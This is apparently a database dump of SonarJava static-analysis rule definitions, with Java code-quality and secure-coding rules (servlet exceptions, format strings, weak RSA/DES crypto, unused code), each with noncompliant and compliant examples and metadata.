617	Exceptions should not be thrown from servlet methods	S1989	S1989	squid	<p>\n  Even though the signatures for methods in a servlet include <code>throws IOException, ServletException</code>,\n  it's a bad idea to let such exceptions be thrown.\n  Failure to catch exceptions in a servlet could leave a system in a vulnerable state,\n  possibly resulting in denial-of-service attacks, or the exposure of sensitive information because when\n  a servlet throws an exception, the servlet container typically sends debugging information back to the user.\n  And that information which could be very valuable to an attacker.\n</p>\n<p>\n  This rule checks all exceptions in methods named "do*" are explicitly handled in servlet classes.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws IOException, ServletException {\n  String ip = request.getRemoteAddr();\n  InetAddress addr = InetAddress.getByName(ip); // Noncompliant; getByName(String) throws UnknownHostException\n  //...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws IOException, ServletException {\n  try {\n    String ip = request.getRemoteAddr();\n    InetAddress addr = InetAddress.getByName(ip);\n    //...\n  }\n  catch (UnknownHostException uhex) {\n    //...\n  }\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/600.html">MITRE, CWE-600</a> - Uncaught Exception in Servlet</li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/s4EVAQ">CERT, ERR01-J</a> - Do not allow exceptions to expose sensitive information</li>\n  <li><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten Category A6</a> - Sensitive Data Exposure</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cert,cwe,error-handling,owasp-a6	f	HTML	1511453807158	1511453807158	3
618	"DateUtils.truncate" from Apache Commons Lang library should not be used	S2718	S2718	squid	<p>The use of the <code>Instant</code> class introduced in Java 8 to truncate a date can be significantly faster than the <code>DateUtils</code> class from Commons Lang.</p>\n\n<p>\n  <strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic Date trunc(Date date) {\n  return DateUtils.truncate(date, Calendar.SECOND);  // Noncompliant \n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\npublic Date trunc(Date date) {\n  Instant instant = date.toInstant();\n  instant = instant.truncatedTo(ChronoUnit.SECONDS);\n  return Date.from(instant);\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	java8,performance	f	HTML	1511453807158	1511453807159	1
619	Overriding methods should do more than simply call the same method in the super class	S1185	S1185	squid	<p>Overriding a method just to call the same method from the super class without performing any other actions is useless and misleading. The only time this is justified is in <code>final</code> overriding methods, where the effect is to lock in the parent class behavior. This rule ignores such overrides of <code>equals</code>, <code>hashCode</code> and <code>toString</code>.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void doSomething() {                \n  super.doSomething();\n}\n\n@Override\npublic boolean isLegal(Action action) {      \n  return super.isLegal(action);\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\n@Override\npublic boolean isLegal(Action action) {         // Compliant - not simply forwarding the call\n  return super.isLegal(new Action(/* ... */));\n}\n\n@Id\n@Override\npublic int getId() {                            // Compliant - there is annotation different from @Override\n  return super.getId();\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807159	1511453807159	1
620	Printf-style format strings should not lead to unexpected behavior at runtime	S2275	S2275	squid	<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the Java compiler, they can contain errors that lead to unexpected behavior or runtime errors. This rule statically validates the good behavior of <code>printf</code>-style formats when calling the <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>, <code>java.io.PrintStream</code> and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of <code>java.io.PrintStream</code> or <code>java.io.PrintWriter</code> classes. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nString.format("The value of my integer is %d", "Hello World");  // Noncompliant; an 'int' is expected rather than a String\nString.format("First {0} and then {1}", "foo", "bar");  //Noncompliant. Looks like there is a confusion with the use of {{java.text.MessageFormat}}, parameters "foo" and "bar" will be simply ignored here\nString.format("Duke's Birthday year is %tX", c);  //Noncompliant; X is not a supported time conversion character\nString.format("Display %3$d and then %d", 1, 2, 3);   //Noncompliant; the second argument '2' is unused\nString.format("Display %0$d and then %d", 1);   //Noncompliant; arguments are numbered starting from 1\nString.format("Too many arguments %d and %d", 1, 2, 3);  //Noncompliant; the third argument '3' is unused\nString.format("Not enough arguments %d and %d", 1);  //Noncompliant; the second argument is missing\nString.format("First Line\\n");   //Noncompliant; %n should be used in place of \\n to produce the platform-specific line separator\nString.format("%&lt; is equals to %d", 2);   //Noncompliant; the argument index '&lt;' refers to the previous format specifier but there isn't one\nString.format("Is myObject null ? %b", myObject);   //Noncompliant; when a non-boolean argument is formatted with %b, it prints true for any nonnull value, and false for null. Even if intended, this is misleading. It's better to directly inject the boolean value (myObject == null in this case)\nString.format("value is " + value); // Noncompliant\nString s = String.format("string without arguments"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nString.format("The value of my integer is %d", 3);\nString.format("First %s and then %s", "foo", "bar");\nString.format("Duke's Birthday year is %tY", c);\nString.format("Display %2$d and then %d", 1, 3);\nString.format("Display %1$d and then %d", 1);\nString.format("Too many arguments %d %d", 1, 2);\nString.format("Not enough arguments %d and %d", 1, 2);\nString.format("First Line%n");\nString.format("%d is equals to %&lt;", 2);\nString.format("Is myObject null ? %b", myObject == null);\nString.format("value is %d", value);\nString s = "string without arguments"; \n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453807160	1511453807161	2
621	Dissimilar primitive wrappers should not be used with the ternary operator without explicit casting	S2154	S2154	squid	<p>If wrapped primitive values (e.g. <code>Integers</code> and <code>Floats</code>) are used in a ternary operator (e.g. <code>a?b:c</code>), both values will be unboxed and coerced to a common type, potentially leading to unexpected results. To avoid this, add an explicit cast to a compatible type.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nInteger i = 123456789;\nFloat f = 1.0f;\nNumber n = condition ? i : f;  // Noncompliant; i is coerced to float. n = 1.23456792E8\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nInteger i = 123456789;\nFloat f = 1.0f;\nNumber n = condition ? (Number) i : f;  // n = 123456789\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807161	1511453807161	2
622	Methods should not be empty	S1186	S1186	squid	<p>There are several reasons for a method not to have a method body:</p>\n<ul>\n  <li>It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production.</li>\n  <li>It is not yet, or never will be, supported. In this case an <code>UnsupportedOperationException</code> should be thrown.</li>\n  <li>The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override.</li>\n  <li>\n    There is a desire to provide a public, no-args constructor.\n    In this case, it can simply be omitted from the code; a default constructor will automatically be generated.\n  </li>\n</ul>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething() {\n}\n\npublic void doSomethingElse() {\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n@Override\npublic void doSomething() {\n  // Do nothing because of X and Y.\n}\n\n@Override\npublic void doSomethingElse() {\n  throw new UnsupportedOperationException();\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>An abstract class may have empty methods, in order to provide default implementations for child classes.</p>\n<pre>\npublic abstract class Animal {\n  void speak() {\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	suspicious	f	HTML	1511453807162	1511453807162	1
623	Unused labels should be removed	S1065	S1065	squid	<p>If a label is declared but not used in the program, it can be considered as dead code and should therefore be removed.</p>\n<p>This will improve maintainability as developers will not wonder what this label is used for.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid foo() {\n  outer: //label is not used.\n  for(int i = 0; i<10; i++) {\n    break;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvoid foo() {\n  for(int i = 0; i<10; i++) {\n    break;\n  }\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li>MISRA C:2012, 2.6 - A function should not contain unused label declarations</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	misra,unused	f	HTML	1511453807163	1511453807163	1
624	"Object.wait(...)" and "Condition.await(...)" should be called inside a "while" loop	S2274	S2274	squid	<p>According to the Java <code>Condition</code> interface documentation:</p>\n<blockquote>\n<p>When waiting upon a <code>Condition</code>, a "spurious wakeup" is permitted to occur, in general, as a concession to the underlying platform semantics. This has little practical impact on most application programs as a Condition should always be waited upon in a loop, testing the state predicate that is being waited for. An implementation is free to remove the possibility of spurious wakeups but it is recommended that applications programmers always assume that they can occur and so always wait in a loop.</p>\n</blockquote>\n<p>The same advice is also found for the <code>Object.wait(...)</code> method:</p>\n<blockquote>\n<p>waits should always occur in loops, like this one:</p>\n<pre>\nsynchronized (obj) {\n  while (&lt;condition does not hold&gt;){\n    obj.wait(timeout); \n  }\n   ... // Perform action appropriate to condition\n}\n</pre>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nsynchronized (obj) {\n  if (!suitableCondition()){\n    obj.wait(timeout);   //the thread can wakeup whereas the condition is still false\n  }\n   ... // Perform action appropriate to condition\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nsynchronized (obj) {\n  while (!suitableCondition()){\n    obj.wait(timeout);\n  }\n   ... // Perform action appropriate to condition\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/display/java/THI03-J.+Always+invoke+wait%28%29+and+await%28%29+methods+inside+a+loop">CERT THI03-J</a> - Always invoke wait() and await() methods inside a loop\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cert,multi-threading	f	HTML	1511453807164	1511453807164	2
625	Boxing and unboxing should not be immediately reversed	S2153	S2153	squid	<p>Boxing is the process of putting a primitive value into an analogous object, such as creating an <code>Integer</code> to hold an <code>int</code> value. Unboxing is the process of retrieving the primitive value from such an object.</p>\n<p>Since the original value is unchanged during boxing and unboxing, there's no point in doing either when not needed. This also applies to autoboxing and auto-unboxing (when Java implicitly handles the primitive/object transition for you).</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void examineInt(int a) { \n  //... \n}\n\npublic void examineInteger(Integer a) { \n  // ...\n}\n\npublic void func() {\n  int i = 0;\n  Integer iger1 = Integer.valueOf(0);\n  double d = 1.0;\n\n  int dIntValue = new Double(d).intValue(); // Noncompliant\n\n  examineInt(new Integer(i).intValue()); // Noncompliant; explicit box/unbox\n  examineInt(Integer.valueOf(i));  // Noncompliant; boxed int will be auto-unboxed\n\n  examineInteger(i); // Compliant; value is boxed but not then unboxed\n  examineInteger(iger1.intValue()); // Noncompliant; unboxed int will be autoboxed\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807165	1511453807165	1
626	Collapsible "if" statements should be merged	S1066	S1066	squid	<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (file != null) {\n  if (file.isFile() || file.isDirectory()) {\n    /* ... */\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (file != null &amp;&amp; isFileOrDirectory(file)) {\n  /* ... */\n}\n\nprivate static boolean isFileOrDirectory(File file) {\n  return file.isFile() || file.isDirectory();\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807166	1511453807166	1
627	Cryptographic RSA algorithms should always incorporate OAEP (Optimal Asymmetric Encryption Padding)	S2277	S2277	squid	<p>Without OAEP in RSA encryption, it takes less work for an attacker to decrypt the data or infer patterns from the ciphertext. This rule logs an issue as soon as a literal value starts with <code>RSA/NONE</code>. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nCipher rsa = javax.crypto.Cipher.getInstance("RSA/NONE/NoPadding");\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nCipher rsa = javax.crypto.Cipher.getInstance("RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING");\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/780.html">MITRE CWE-780</a> - Use of RSA Algorithm without OAEP</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE CWE-327</a>: Use of a Broken or Risky Cryptographic Algorithm</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A5-Security_Misconfiguration">OWASP Top Ten 2013 Category A5</a> - Security Misconfiguration</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n<li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#RSA_NO_PADDING">RSA NoPadding Unsafe</a></li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe,owasp-a5,owasp-a6,sans-top25-porous	f	HTML	1511453807167	1511453807167	3
628	"final" classes should not have "protected" members	S2156	S2156	squid	The difference between <code>private</code> and <code>protected</code> visibility is that child classes can see and use <code>protected</code> members, but they cannot see <code>private</code> ones. Since a <code>final</code> class will have no children, marking the members of a <code>final</code> class <code>protected</code> is confusingly pointless.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic final class MyFinalClass {\n\n  protected String name = "Fred";  // Noncompliant\n  protected void setName(String name) {  // Noncompliant\n    // ...\n  }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic final class MyFinalClass {\n\n  private String name = "Fred";\n  public void setName(String name) {\n    // ...\n  }\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	confusing	f	HTML	1511453807167	1511453807168	1
632	Unused private fields should be removed	S1068	S1068	squid	<p>\nIf a private field is declared but not used in the program, it can be considered dead code and should therefore be removed.\nThis will improve maintainability because developers will not wonder what the variable is used for.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  private int foo = 42;\n\n  public int compute(int a) {\n    return a * 42;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  public int compute(int a) {\n    return a * 42;\n  }\n}\n</pre>\n\n<h2>Exceptions</h2>\n\n<p>\nThe Java serialization runtime associates with each serializable class a version number, called <code>serialVersionUID</code>, which is used during deserialization to verify that the sender and receiver of a serialized object have loaded classes for that object that are compatible with respect to serialization.\nA serializable class can declare its own <code>serialVersionUID</code> explicitly by declaring a field named <code>serialVersionUID</code> that must be static, final, and of type long. By definition those <code>serialVersionUID</code> fields should not be reported by this rule:\n</p>\n\n<pre>\npublic class MyClass implements java.io.Serializable {\n  private static final long serialVersionUID = 42L;\n}\n</pre>\n<p>Moreover, this rule doesn't raise any issue on annotated fields.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453807172	1511453807173	1
633	Synchronization should not be based on Strings or boxed primitives	S1860	S1860	squid	<p>Objects which are pooled and potentially reused should not be used for synchronization. If they are, it can cause unrelated threads to deadlock with unhelpful stacktraces. Specifically, <code>String</code> literals, and boxed primitives such as Integers should not be used as lock objects because they are pooled and reused. The story is even worse for <code>Boolean</code> objects, because there are only two instances of <code>Boolean</code>, <code>Boolean.TRUE</code> and <code>Boolean.FALSE</code> and every class that uses a Boolean will be referring to one of the two.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nprivate static final Boolean bLock = Boolean.FALSE;\nprivate static final Integer iLock = Integer.valueOf(0);\nprivate static final String sLock = "LOCK";\n\npublic void doSomething() {\n\n  synchronized(bLock) {  // Noncompliant\n    // ...\n  }\n  synchronized(iLock) {  // Noncompliant\n    // ...\n  }\n  synchronized(sLock) {  // Noncompliant\n    // ...\n  }\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nprivate static final Object lock1 = new Object();\nprivate static final Object lock2 = new Object();\nprivate static final Object lock3 = new Object();\n\npublic void doSomething() {\n\n  synchronized(lock1) {\n    // ...\n  }\n  synchronized(lock2) {\n    // ...\n  }\n  synchronized(lock3) {\n    // ...\n  }\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/rQGeAQ">CERT, LCK01-J</a> - Do not synchronize on objects that may be reused</li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cert,multi-threading	f	HTML	1511453807173	1511453807173	2
634	Neither DES (Data Encryption Standard) nor DESede (3DES) should be used	S2278	S2278	squid	<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>\n<blockquote>\n<p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer provides the security that is needed to protect federal government information.</p>\n<p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nCipher c = Cipher.getInstance("DESede/ECB/PKCS5Padding");\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nCipher c = Cipher.getInstance("AES/GCM/NoPadding");\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE CWE-326</a> - Inadequate Encryption Strength</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n<li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a></li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe,owasp-a6,sans-top25-porous	f	HTML	1511453807174	1511453807174	3
635	"Cloneables" should implement "clone"	S2157	S2157	squid	<p>Simply implementing <code>Cloneable</code>  without also overriding <code>Object.clone()</code> does not necessarily make the class cloneable. While the <code>Cloneable</code> interface does not include a <code>clone</code> method, it is required by convention, and ensures true cloneability. Otherwise the default JVM <code>clone</code> will be used, which copies primitive values and object references from the source to the target. I.e. without overriding <code>clone</code>, any cloned instances will potentially share members with the source instance.</p>\n\n<p>Removing the <code>Cloneable</code> implementation and providing a good copy constructor is another viable (some say preferable) way of allowing a class to be copied.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Team implements Cloneable {  // Noncompliant\n  private Person coach;\n  private List&lt;Person&gt; players;\n  public void addPlayer(Person p) {...}\n  public Person getCoach() {...}\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Team implements Cloneable {\n  private Person coach;\n  private List&lt;Person&gt; players;\n  public void addPlayer(Person p) { ... }\n  public Person getCoach() { ... }\n\n  @Override\n  public Object clone() { \n    Team clone = (Team) super.clone();\n    //...\n  }\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	\N	f	HTML	1511453807175	1511453807175	2
636	Related "if/else if" statements should not have the same condition	S1862	S1862	squid	<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first one with a condition that evaluates to <code>true</code>. </p>\n<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 1)  // Noncompliant\n  moveWindowToTheBackground();\n}\n\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 3)\n  moveWindowToTheBackground();\n}\n\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cert,pitfall,unused	f	HTML	1511453807176	1511453807176	2
638	Silly equality checks should not be made	S2159	S2159	squid	<p>Comparisons of dissimilar types will always return false. The comparison and all its dependent code can simply be removed. This includes:</p>\n<ul>\n<li> comparing an object with null</li>\n<li> comparing an object with an unrelated primitive (E.G. a string with an int)</li>\n<li> comparing unrelated classes</li>\n<li> comparing an unrelated <code>final class</code> and <code>interface</code></li>\n<li> comparing an array to a non-array</li>\n<li> comparing two arrays</li>\n</ul>\n<p>Specifically in the case of arrays, since arrays don't override <code>Object.equals()</code>, calling <code>equals</code> on two arrays is the same as comparing their addresses. This means that <code>array1.equals(array2)</code> is equivalent to <code>array1==array2</code>.</p>\n<p>However, some developers might expect <code>Array.equals(Object obj)</code> to do more than a simple memory address comparison, comparing for instance the size and content of the two arrays. Instead, the <code>==</code> operator or <code>Arrays.equals(array1, array2)</code> should always be used with arrays.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\ninterface KitchenTool { ... };\ninterface Plant {...}\n\npublic final class Spatula implements KitchenTool { ... }\npublic class Tree implements Plant { ...}\n//...\n\nSpatula spatula = new Spatula();\nKitchenTool tool = spatula;\nKitchenTool [] tools = {tool};\n\nTree tree = new Tree();\nPlant plant = tree;\nTree [] trees = {tree};\n\n\nif (spatula.equals(tree)) { // Noncompliant; unrelated classes\n  // ...\n}\nelse if (spatula.equals(plant)) { // Noncompliant; unrelated final class and interface\n  // ...\n}\nelse if (tool.equals(tools)) { // Noncompliant; array &amp; non-array\n  // ...\n}\nelse if (trees.equals(tools)) {  // Noncompliant; incompatible arrays\n  // ...\n}\nelse if (tree.equals(null)) {  // Noncompliant\n  // ...\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	unused	f	HTML	1511453807177	1511453807178	2
639	Security constraints should be defined	S3369	S3369	squid	<p>Websphere, Tomcat, and JBoss web servers allow the definition of role-based access to servlets. It may not be granular enough for your purposes, but it's a start, and should be used at least as a base.</p>\n<p>This rule raises an issue when a <em>web.xml</em> file has no <code>&lt;security-contraint&gt;</code> elements.</p>\n\n<h2>See</h2>\n<ul>\n<li> <a href="https://cwe.mitre.org/data/definitions/284.html">MITRE, CWE-284</a> - Improper Access Control\n</li><li> <a href="https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control">OWASP Top Ten 2013 Category A7</a> - Missing Function Level Access Control\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	3h	\N	\N	cwe,jee,owasp-a7,websphere	f	HTML	1511453807179	1511453807179	3
640	Public constants and fields initialized at declaration should be "static final" rather than merely "final"	S1170	S1170	squid	<p>Making a constant just <code>final</code> as opposed to <code>static final</code> leads to duplicating its value for every instance of the class, uselessly increasing the amount of memory required to execute the application.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Myclass {\n  public final int THRESHOLD = 3;   \n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Myclass {\n  public static final int THRESHOLD = 3;    // Compliant\n}\n</pre>\n<h2>Exceptions (for Java)</h2>\n\n<p>No issues are reported on final fields of inner classes whose type is not a primitive or a String. Indeed according to the Java specification:</p>\n<blockquote>\n<p>An inner class is a nested class that is not explicitly or implicitly declared static. Inner classes may not declare static initializers (§8.7) or member interfaces. Inner classes may not declare static members, unless they are compile-time constant fields (§15.28).</p>\n</blockquote>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453807179	1511453807180	1
641	Only static class initializers should be used	S1171	S1171	squid	<p>Non-static initializers are rarely used, and can be confusing for most developers.</p>\n<p>When possible, they should be refactored into standard constructors or field initializers.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;() {\n\n    // Noncompliant - HashMap should be extended only to add behavior, not for initialization\n    {\n      put("a", "b");\n    }\n\n  };\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass {\n  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;();\n\n  static {\n    MY_MAP.put("a", "b");\n  }\n}\n</pre>\n<p>or using Guava:</p>\n<pre>\nclass MyClass {\n  // Compliant\n  private static final Map&lt;String, String&gt; MY_MAP = ImmutableMap.of("a", "b");\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	pitfall	f	HTML	1511453807180	1511453807180	1
642	Unused method parameters should be removed	S1172	S1172	squid	<p>Unused parameters are misleading. Whatever the value passed to such parameters is, the behavior will be the same.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nvoid doSomething(int a, int b) {     // "b" is unused\n  compute(a);\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nvoid doSomething(int a) { \n  compute(a);\n}\n</pre>\n<h2>Exceptions</h2>\n\n<p>Override and implementation methods are excluded, as are parameters annotated with <code>@Observes</code>, and methods that are intended to be overridden.</p>\n<pre>\n@override\nvoid doSomething(int a, int b) {     // no issue reported on b\n  compute(a);\n}\n\npublic void foo(String s) {\n  // designed to be extended but noop in standard case\n}\n\nprotected void bar(String s) {\n  //open-closed principle\n}\n\npublic void qix(String s) {\n  throw new UnsupportedOperationException("This method should be implemented in subclasses");\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions.</li>\n<li> MISRA C:2012, 2.7 - There should be no unused parameters in functions</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra,unused	f	HTML	1511453807181	1511453807181	1
643	The Array.equals(Object obj) method should not be used	S1294	S1294	squid	<p>Since arrays do not override <code>Object.equals()</code>, calling equals on two arrays is the same as comparing their addresses. This means that <code>array1.equals(array2)</code> is equivalent to <code>array1==array2</code>. </p>\n<p>However, some developers might expect <code>Array.equals(Object obj)</code> to do more than a simple memory address comparison, comparing for instance the size and content of the two arrays. To prevent such a misunderstanding, the '==' operator or <code>Arrays.equals(array1, array2)</code> must always be used in place of the <code>Array.equals(Object obj)</code> method.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif(array1.equals(array2)){...}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif(Arrays.equals(array1, array2)){...}\n</pre>\n<p>or</p>\n<pre>\nif(array1 == array2){...}\n</pre>\n\n<h2>Deprecated</h2>\n<p>This rule is deprecated, use {rule:squid:S2159} instead.</p>	3	\N	DEPRECATED	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807182	1511453807182	1
644	Methods of "Random" that return floating point values should not be used in random integer generation	S2140	S2140	squid	<p>There is no need to multiply the output of <code>Random</code>'s <code>nextDouble</code> method to get a random integer. Use the <code>nextInt</code> method instead.</p>\n<p>This rule raises an issue when the return value of any of <code>Random</code>'s methods that return a floating point value is converted to an integer.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nRandom r = new Random();\nint rand = (int)r.nextDouble() * 50;  // Noncompliant way to get a pseudo-random value between 0 and 50\nint rand2 = (int)r.nextFloat(); // Noncompliant; will always be 0;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nRandom r = new Random();\nint rand = r.nextInt(50);  // returns pseudo-random value between 0 and 50\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807183	1511453807183	1
